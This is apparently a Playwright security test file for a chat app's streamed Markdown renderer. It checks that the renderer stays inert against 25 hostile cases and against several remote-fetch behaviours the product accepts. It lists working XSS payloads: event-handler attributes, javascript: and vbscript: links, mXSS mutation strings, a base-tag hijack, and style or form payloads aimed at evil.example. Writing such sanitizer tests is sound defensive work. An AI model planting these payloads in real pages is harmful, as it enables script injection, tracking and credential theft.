// journey-security.spec.mjs — journey 10: rendering and Markdown safety (§5.3 item 10).
//
// The case list is the one `.scratch/ci/evidence/deps.md` §4 fixed against the
// real vendored pair (marked 18.0.13 + DOMPurify 3.4.15): 25 hostile cases that
// must stay inert, plus the inert-but-negative results that are product
// decisions. Every case runs through the REAL streamed path — the fixture
// server's SSE frames, the wasm engine's render buffer and js/markdown.js — as
// its own answer card, never through a synthetic host element:
//
//   * each case is one test, so a regression names the payload that broke;
//   * the payload is rendered first (the position the deps reference used), with
//     a canary and a control phrase after it, except for the three payloads that
//     swallow everything after them (raw <script> block, an unclosed HTML
//     comment, an unclosed code fence) — those are streamed last;
//   * the control makes "strip everything" a failure: an ordinary link and
//     inline code must still render in the same answer;
//   * the three incomplete cases are held mid-stream (fixture manual mode) and
//     audited before the stream finishes as well as after.

import { test, expect } from '@playwright/test';
import { bootApp } from './lib/app.mjs';
import { fixtureClient } from './lib/network.mjs';
import { UPSTREAM_HOSTS } from './fixtures/upstream.mjs';

const fixture = fixtureClient();

test.beforeEach(async () => { await fixture.reset(); });

/** No request may leave a fixture origin, and no fixture may be missing. */
async function expectHermetic(app) {
  expect(app.net.blocked, app.net.describeBlocked()).toEqual([]);
  for (const request of app.net.proxied) {
    expect(UPSTREAM_HOSTS).toContain(new URL(request.url).host);
  }
  const { misses } = await fixture.requests();
  expect(misses, `fixture gaps: ${misses.join(', ')}`).toEqual([]);
}

/** Executable elements the sanitizer must never emit (deps.md §4). */
const EXECUTABLE = ['script', 'iframe', 'object', 'embed', 'base', 'meta', 'link', 'style'];

/** Inspect the newest answer card: execution probe, executable elements, handler
 *  attributes and dangerous URL schemes, plus the rendered HTML and text. */
async function auditCard(page) {
  return page.evaluate((executableTags) => {
    const card = [...document.querySelectorAll('#b-transcript .b-ans')].at(-1);
    const scope = card?.querySelector('.b-md') || null;
    const out = {
      present: !!scope,
      executed: window.__XSS !== undefined,
      executable: [], handlers: [], schemes: [], html: '', text: '',
    };
    if (!scope) return out;
    for (const el of scope.querySelectorAll('*')) {
      const tag = el.tagName.toLowerCase();
      if (executableTags.includes(tag)) out.executable.push(tag);
      for (const attr of el.attributes) {
        if (/^on/i.test(attr.name)) out.handlers.push(`${tag}[${attr.name}]`);
        else if (/^\s*(?:javascript|vbscript)\s*:|^\s*data:text\/html/i.test(attr.value)) {
          out.schemes.push(`${tag}[${attr.name}]`);
        }
      }
    }
    out.html = scope.innerHTML;
    out.text = scope.textContent || '';
    return out;
  }, EXECUTABLE);
}

/** Nothing executed, no executable element, no handler attribute, no
 *  javascript:/vbscript:/data:text/html attribute value. */
function expectInert(audit, label) {
  expect(audit.present, `${label}: no answer card rendered`).toBe(true);
  expect(audit.executed, `${label}: a payload executed`).toBe(false);
  expect(audit.executable, `${label}: executable element survived`).toEqual([]);
  expect(audit.handlers, `${label}: event handler attribute survived`).toEqual([]);
  expect(audit.schemes, `${label}: dangerous URL scheme survived`).toEqual([]);
}

/** Ordinary content that must keep working in every hostile answer. */
const CONTROL = 'Control: read the [docs](https://example.com/docs) and run `npm run check` first.';

/** Frames the fixture splits an answer into (the engine's unit of delivery). */
const framesOf = (text) => text.split(/(\s+)/).filter((s) => s !== '');
/** How many frames the fixture must release to reach the end of `token`. */
const framesUpTo = (text, token) => framesOf(text).indexOf(token) + 1;

/** Wait for the fixture to own a live held stream (409 until then), then grant
 *  exactly `count` frames. Explicit events only, no sleeps. */
async function releaseWhenHeld(count) {
  await expect.poll(async () => {
    try { return (await fixture.release(count)).ok === true; } catch { return false; }
  }, { timeout: 15000 }).toBe(true);
}

/** Stream one answer (fixture auto mode) and return its settled card + audit. */
async function streamAnswer(app, page, answer, question = 'Render this answer') {
  await fixture.setChat({ answer });
  await app.ask(question);
  const settled = await app.waitForAnswer();
  return { settled, audit: await auditCard(page) };
}

/** The control must still be a working link and inline code, in this answer. */
async function expectControlSurvives(page, label) {
  const card = page.locator('#b-transcript .b-ans').last().locator('.b-md');
  await expect(card.locator('a', { hasText: 'docs' }), `${label}: the control link must render`)
    .toHaveAttribute('href', 'https://example.com/docs');
  await expect(card.locator('code', { hasText: 'npm run check' }), `${label}: the control code must render`)
    .toHaveText('npm run check');
}

// ── journey 10: rendering ─────────────────────────────────────────────────

const CODE_BODY = Array.from({ length: 30 }, (_, i) => `const line${i} = ${i};`).join('\n');
const RICH_ANSWER = [
  '## Findings',
  '',
  'The **catalog** is synthetic. Read the [notes](https://example.com/notes) and use `npm run check`.',
  '',
  '- first item',
  '- second item',
  '',
  '```js',
  CODE_BODY,
  '```',
].join('\n');

test('@security a streamed answer renders prose, links, a long code block and COPY', async ({ page, browserName }) => {
  const app = await bootApp(page);
  // Clipboard *read-back* needs permissions Playwright only grants on Chromium
  // (`grantPermissions` rejects `clipboard-read`/`clipboard-write` elsewhere), so
  // the clipboard content is asserted where the API is controllable and the
  // control's observable contract is asserted everywhere. Same claim, engine
  // branch stated rather than a silent skip.
  const canReadClipboard = browserName === 'chromium';
  if (canReadClipboard) await page.context().grantPermissions(['clipboard-read', 'clipboard-write']);
  const { settled } = await streamAnswer(app, page, RICH_ANSWER, 'Render the release notes');

  expect(settled.text).toContain('The catalog is synthetic.');
  const card = page.locator('#b-transcript .b-ans').last().locator('.b-md');
  await expect(card.locator('h2')).toHaveText('Findings');
  await expect(card.locator('strong')).toHaveText('catalog');
  await expect(card.locator('li')).toHaveCount(2);
  await expect(card.locator('code').first()).toHaveText('npm run check');
  await expect(card.locator('a', { hasText: 'notes' })).toHaveAttribute('href', 'https://example.com/notes');

  // The long code block arrives whole, highlighted, with a working COPY control.
  const code = card.locator('pre code');
  await expect(code).toHaveCount(1);
  expect((await code.innerText()).trimEnd()).toBe(CODE_BODY);
  await expect(code.locator('span').first(), 'the code is highlighted').toBeVisible();
  const copy = card.locator('pre .copy-btn');
  await expect(copy).toHaveText('COPY');
  // Capture the exact string the control hands to the clipboard API. Unlike a
  // real read-back (Chromium-only permissions), this works on every engine and is
  // the stronger claim: it is what the app wrote, not a marshalled round trip.
  await page.evaluate(() => {
    if (!navigator.clipboard) Object.defineProperty(navigator, 'clipboard', { value: {}, configurable: true });
    const real = navigator.clipboard.writeText?.bind(navigator.clipboard);
    window.__copied = null;
    navigator.clipboard.writeText = (text) => {
      window.__copied = text;
      return real ? real(text).catch(() => {}) : Promise.resolve();
    };
  });
  await copy.click();
  await expect(copy).toHaveText('COPIED');
  const written = String(await page.evaluate(() => window.__copied));
  expect(written.trimEnd()).toBe(CODE_BODY);
  expect(written, 'the COPY label itself must not reach the clipboard').not.toContain('COPY');
  if (canReadClipboard) {
    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
    expect(clipboard.trimEnd(), 'the real clipboard holds the code block').toBe(CODE_BODY);
  }
  // The control resets on its own, so a second copy stays possible.
  await expect(copy).toHaveText('COPY', { timeout: 5000 });

  // Layout: a 30-line block must not push the page or the card sideways.
  const overflow = await page.evaluate(() => {
    const body = [...document.querySelectorAll('#b-transcript .b-ans .b-md')].at(-1);
    return {
      page: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      card: body.scrollWidth - body.clientWidth,
    };
  });
  expect(overflow.page, 'the page must not scroll sideways').toBeLessThanOrEqual(1);
  expect(overflow.card, 'the card must not clip its content sideways').toBeLessThanOrEqual(1);
  await expectHermetic(app);
  expect(await app.allProblems()).toEqual([]);
});

const FENCED_ANSWER = [
  'Here is the code the release added.',
  '',
  '```js',
  'const a = 1;',
  'const b = 2;',
  '```',
  '',
  'That is all.',
].join('\n');

test('@security an incomplete streamed code fence holds the layout and settles', async ({ page }) => {
  await fixture.setChat({ mode: 'manual', answer: FENCED_ANSWER });
  const app = await bootApp(page);
  await app.ask('Stream a fenced block');
  await releaseWhenHeld(framesUpTo(FENCED_ANSWER, 'const'));

  // Mid-stream the fence is still open: the renderer sees an unterminated
  // document. It must not break the layout.
  const card = page.locator('#b-transcript .b-ans').last().locator('.b-md');
  await expect(card).toContainText('const');
  const midstreamOverflow = await page.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  );
  expect(midstreamOverflow, 'an open fence must not widen the page').toBeLessThanOrEqual(1);

  await fixture.release();
  const answer = await app.waitForAnswer();
  expect(answer.text).toContain('That is all.');
  const settled = page.locator('#b-transcript .b-ans').last().locator('.b-md');
  await expect(settled.locator('pre code')).toHaveCount(1);
  expect((await settled.locator('pre code').innerText()).trimEnd()).toBe('const a = 1;\nconst b = 2;');
  await expect(settled.locator('p', { hasText: 'That is all.' })).toBeVisible();
  const settledOverflow = await page.evaluate(
    () => document.documentElement.scrollWidth - document.documentElement.clientWidth,
  );
  expect(settledOverflow).toBeLessThanOrEqual(1);
  await expectHermetic(app);
  expect(await app.allProblems()).toEqual([]);
});

// ── journey 10: the hostile case list (deps.md §4, 25 cases) ──────────────
//
// `evidence` is what the payload itself must leave behind (HTML or rendered
// text) — the deps reference recorded each of these — so a case cannot pass by
// never reaching the renderer. `swallows` marks the three payloads that consume
// whatever follows them in the stream (a raw <script> block, an unclosed HTML
// comment, an unclosed code fence): they are streamed last, after the control.
// `holdAt` marks an incomplete payload that is audited mid-stream as well.

const HOSTILE_CASES = [
  {
    name: 'event handler attribute',
    payload: '<img src=x onerror="window.__XSS=1">',
    evidence: { html: '<img src="x"' },
  },
  {
    name: 'event handler, malformed/unclosed',
    payload: '<div><svg onload=window.__XSS=1><b onmouseover=window.__XSS=1',
    evidence: { html: '<svg' },
  },
  {
    name: 'script element',
    payload: 'before <script>window.__XSS=1</script> after',
    evidence: { text: 'before' },
  },
  {
    name: 'dangerous scheme, markdown link',
    payload: '[click](javascript:window.__XSS=1)',
    evidence: { text: 'click' },
  },
  {
    name: 'dangerous scheme, raw anchor',
    payload: '<a href="javascript:window.__XSS=1">x</a>',
    evidence: { html: '<a>' },
  },
  {
    name: 'data: URL in anchor',
    payload: '<a href="data:text/html,<script>window.__XSS=1</script>">x</a>',
    evidence: { text: 'x' },
  },
  {
    name: 'vbscript: URL',
    payload: '<a href="vbscript:window.__XSS=1">x</a>',
    evidence: { text: 'x' },
  },
  {
    name: 'iframe / object / embed',
    payload: '<iframe src="javascript:window.__XSS=1"></iframe>'
      + '<object data="javascript:window.__XSS=1"></object>'
      + '<embed src="javascript:window.__XSS=1">',
  },
  {
    name: 'base tag hijack',
    payload: '<base href="https://evil.example/"><a href="x">x</a>',
    evidence: { html: 'href="x"' },
  },
  // Payload first on purpose: this is the position the deps reference recorded.
  {
    name: 'style element / @import',
    payload: '<style>@import url("https://evil.example/x.css");</style><p>x</p>',
    evidence: { text: 'x' },
  },
  {
    name: 'autofocus + onfocus',
    payload: '<input autofocus onfocus=window.__XSS=1><select autofocus onfocus=window.__XSS=1>',
    evidence: { text: 'autofocus' },
  },
  {
    name: 'marquee ontoggle/onstart',
    payload: '<details open ontoggle=window.__XSS=1><marquee onstart=window.__XSS=1>x</marquee></details>',
    evidence: { text: 'x' },
  },
  {
    name: 'markdown image with dangerous URL',
    payload: '![x](javascript:window.__XSS=1)',
    evidence: { html: 'alt="x"' },
  },
  {
    name: 'svg animate/onbegin + xlink',
    payload: '<svg><animate onbegin=window.__XSS=1 attributeName=x dur=1s>'
      + '<a xlink:href="javascript:window.__XSS=1"><text>x</text></a></svg>',
    evidence: { html: '<svg' },
  },
  {
    name: 'svg nested script',
    payload: '<svg><script>window.__XSS=1</script></svg>',
    evidence: { html: '<svg' },
  },
  {
    name: 'MathML mglyph mXSS',
    payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=window.__XSS=1>',
    evidence: { html: '<math' },
    swallows: true,
  },
  {
    name: 'form/math re-contextualisation',
    payload: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=window.__XSS=1>',
    evidence: { html: '<form>' },
    // The unterminated <style> swallows everything after it (and DOMPurify drops
    // that text), so this payload is streamed last as well.
    swallows: true,
  },
  {
    name: 'noscript/title mutation',
    payload: '<noscript><p title="</noscript><img src=x onerror=window.__XSS=1>">',
  },
  {
    name: 'template content',
    payload: '<template><img src=x onerror=window.__XSS=1></template>',
    evidence: { html: '<template' },
  },
  {
    name: 'html comment payload',
    payload: '<!--<img src=x onerror=window.__XSS=1>-->',
  },
  {
    name: 'incomplete streamed attribute',
    payload: 'answer so far <img src=x onerror="window.__XSS=1',
    evidence: { text: '<img src=x onerror="window.__XSS=1' },
    holdAt: 'onerror="window.__XSS=1',
  },
  {
    name: 'incomplete streamed markdown link',
    payload: 'see [docs](javascript:window.__XSS=1',
    evidence: { text: '[docs](javascript:window.__XSS=1' },
    holdAt: '[docs](javascript:window.__XSS=1',
  },
  {
    name: 'incomplete streamed tag',
    payload: 'code: <scr',
    evidence: { text: '<scr' },
    holdAt: '<scr',
  },
  {
    name: 'malformed markdown (unclosed)',
    payload: '**bold <b>unclosed [link](javascript:window.__XSS=1\n```js\nconst a = "<script>window.__XSS=1</script>"',
    // The literal <b> tag is dropped and its text kept in the same paragraph.
    evidence: { text: '**bold unclosed' },
    swallows: true,
  },
  {
    name: 'script-like content, no tag',
    payload: 'javascript:window.__XSS=1 and <script>alert(1)',
    evidence: { text: 'javascript:window.__XSS=1 and' },
    swallows: true,
  },
];

for (const spec of HOSTILE_CASES) {
  test(`@security hostile markup: ${spec.name} stays inert`, async ({ page }) => {
    const canary = `Canary ${spec.name}.`;
    const body = `${spec.payload}\n\n${canary}\n\n${CONTROL}`;
    const answer = spec.swallows ? `${CONTROL}\n\n${canary}\n\n${spec.payload}` : body;

    let app;
    let settled;
    let audit;
    if (spec.holdAt) {
      // Manual mode: the fixture holds every frame, so the audit below sees the
      // renderer's state while the payload's markup is still unterminated.
      await fixture.setChat({ mode: 'manual', answer });
      app = await bootApp(page);
      await app.ask(`Hostile case: ${spec.name}`);
      await releaseWhenHeld(framesUpTo(answer, spec.holdAt));
      await expect(page.locator('#b-transcript .b-ans').last()).toContainText(spec.holdAt.split(' ')[0]);
      const midstream = await auditCard(page);
      // Mid-stream the partial render must be inert too (an unterminated
      // `<img ... onerror="` is exactly when a parser can be fooled).
      expect(midstream.executed, `${spec.name}: executed mid-stream`).toBe(false);
      expect(midstream.handlers, `${spec.name}: handler attribute mid-stream`).toEqual([]);
      expect(midstream.schemes, `${spec.name}: dangerous scheme mid-stream`).toEqual([]);
      await fixture.release();
      settled = await app.waitForAnswer();
      audit = await auditCard(page);
    } else {
      app = await bootApp(page);
      ({ settled, audit } = await streamAnswer(app, page, answer, `Hostile case: ${spec.name}`));
    }

    expectInert(audit, spec.name);
    expect(settled.text, `${spec.name}: the payload must reach the renderer`).toContain(canary);
    if (spec.evidence?.text) expect(settled.text, `${spec.name}: rendered text`).toContain(spec.evidence.text);
    if (spec.evidence?.html) expect(audit.html, `${spec.name}: rendered html`).toContain(spec.evidence.html);
    await expectControlSurvives(page, spec.name);
    await expectHermetic(app);
  });
}

// The finding this spec produced (reported to the coordinator, fixed in
// js/markdown.js with FORBID_TAGS ['style']): DOMPurify's defaults keep a
// <style> element when the fragment has content before it — the parser then puts
// it in <body> instead of <head>. A streamed answer always has such content, and
// the surviving element fetches `@import url(...)` from a third party. This test
// pins the fixed behaviour, in the position that used to leak.

test('@security a style element after prose is stripped and cannot fetch remote CSS', async ({ page }) => {
  const app = await bootApp(page);
  const answer = [
    'Prose first, then the payload.',
    '',
    '<style>@import url("https://evil.example/tracking.css");</style>',
    '',
    'Canary style after prose.',
  ].join('\n');
  const { settled, audit } = await streamAnswer(app, page, answer, 'Render a style element after prose');

  expect(settled.text).toContain('Canary style after prose.');
  expectInert(audit, 'style after prose');
  expect(audit.executable, 'a <style> element must not survive, in any position').not.toContain('style');
  // The remote stylesheet must never be requested: net.blocked records the
  // attempt even when the app swallows the failure, so this is the real check.
  await expectHermetic(app);
});

// ── journey 10: documented inert-but-negative product decisions ───────────
// deps.md §4 fixed these as "inert, no execution, but a product decision".
// They are asserted as the CURRENT documented behaviour and reported to the
// coordinator; hardening js/markdown.js must update this test deliberately.

const EVIL = 'https://evil.example/';

test('@security the inert-but-negative product decisions behave as documented', async ({ page }) => {
  const app = await bootApp(page);
  // The surviving markup below makes the browser fetch the remote origin. It is
  // served from the test process (never the network) and every attempt is
  // recorded here, so the decisions are asserted without an unexpected request.
  const attempted = [];
  await page.route(`${EVIL}**`, async (route) => {
    attempted.push(new URL(route.request().url()).pathname);
    await route.fulfill({ status: 200, contentType: 'application/octet-stream', body: '' });
  });

  const answer = [
    'Decision 1 remote image: ![tracker](https://evil.example/track.png)',
    '',
    'Decision 2 remote media: <video src="https://evil.example/x.mp4" autoplay></video>'
      + '<audio src="https://evil.example/x.mp3"></audio>',
    '',
    'Decision 3 css url(): <p style="background:url(https://evil.example/x.png)">styled</p>',
    '',
    'Decision 4 form: <form action="https://evil.example/">'
      + '<input type="password" name="pw"><button formaction="https://evil.example/">Go</button></form>',
    '',
    'Decision 5 opener: <a href="https://evil.example/" target="_blank" rel="opener">x</a>',
    '',
    'Stripped: <a href="https://evil.example/" ping="https://evil.example/ping">x</a>'
      + '<meta http-equiv="refresh" content="0;url=https://evil.example/">'
      + '<p style="background:url(javascript:window.__XSS=1)">y</p>',
  ].join('\n');
  const { settled, audit } = await streamAnswer(app, page, answer, 'Render the advisory markup');

  expect(settled.text).toContain('Decision 5 opener');
  // The five surviving cases are the decision; none of them executes.
  expect(audit.executed).toBe(false);
  expect(audit.handlers).toEqual([]);
  expect(audit.schemes).toEqual([]);
  expect(audit.html, 'decision 1: a remote image survives').toContain('src="https://evil.example/track.png"');
  expect(audit.html, 'decision 2: remote media survives with autoplay').toContain('<video src="https://evil.example/x.mp4" autoplay');
  expect(audit.html).toContain('<audio src="https://evil.example/x.mp3"');
  expect(audit.html, 'decision 3: the style attribute and its url() survive')
    .toContain('background:url(https://evil.example/x.png)');
  expect(audit.html, 'decision 4: a form with a remote action and a password input survives')
    .toContain('<form action="https://evil.example/"');
  expect(audit.html).toContain('<input type="password"');
  expect(audit.html, 'decision 5: target=_blank survives without rel=noopener')
    .toContain('<a href="https://evil.example/" target="_blank" rel="opener">');
  // The browser really does fetch what survives: the tracking surface is real,
  // answered locally by this test instead of by any network.
  expect(attempted.some((p) => p.endsWith('.png')), `remote fetches attempted: ${attempted.join(', ')}`).toBe(true);

  // The deps.md §4 notes that did NOT survive: `ping`, meta refresh and a
  // javascript: url() are stripped or inert, so only the five above remain.
  expect(audit.html, 'ping is stripped').not.toContain('ping=');
  expect(audit.html, 'meta refresh is stripped').not.toContain('http-equiv');
  // deps.md §4: `url(javascript:…)` in a style attribute is inert — CSS never
  // runs javascript: URLs. The value may survive (it is not an attribute
  // *scheme*); the execution probe above is the assertion that matters.
  expect(audit.executed, 'a javascript: url() in CSS must not execute').toBe(false);
  expect(audit.executable).toEqual([]);
  await expectHermetic(app);
});
